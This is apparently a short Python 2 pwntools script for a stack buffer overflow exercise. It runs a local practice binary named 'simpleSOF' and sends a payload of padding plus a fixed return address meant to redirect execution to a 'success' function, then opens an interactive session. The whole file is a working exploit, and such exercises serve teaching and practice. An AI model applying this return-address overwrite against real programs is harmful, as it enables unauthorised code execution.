#coding=utf-8

from pwn import *

sh = process('./simpleSOF')

success_addr = 0x0804844d

payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)

print p32(success_addr)

sh.sendline(payload)

sh.interactive()
